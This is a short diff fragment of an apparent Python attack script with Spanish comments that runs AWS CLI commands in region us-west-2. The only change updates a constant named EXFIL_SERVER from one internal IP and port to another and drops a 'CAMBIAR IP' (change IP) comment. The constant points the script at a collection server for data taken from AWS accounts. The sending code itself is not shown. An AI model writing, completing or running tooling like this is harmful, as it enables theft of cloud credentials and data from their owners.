@@ -10,7 +10,7 @@ import socket
 from datetime import datetime
 
 REGION = "us-west-2"
-EXFIL_SERVER = "http://10.1.69.41:8000"  # CAMBIAR IP
+EXFIL_SERVER = "http://10.5.9.41:5001"
 
 def run_aws_command(command, description):
     """Ejecuta comando AWS CLI y muestra resultado"""
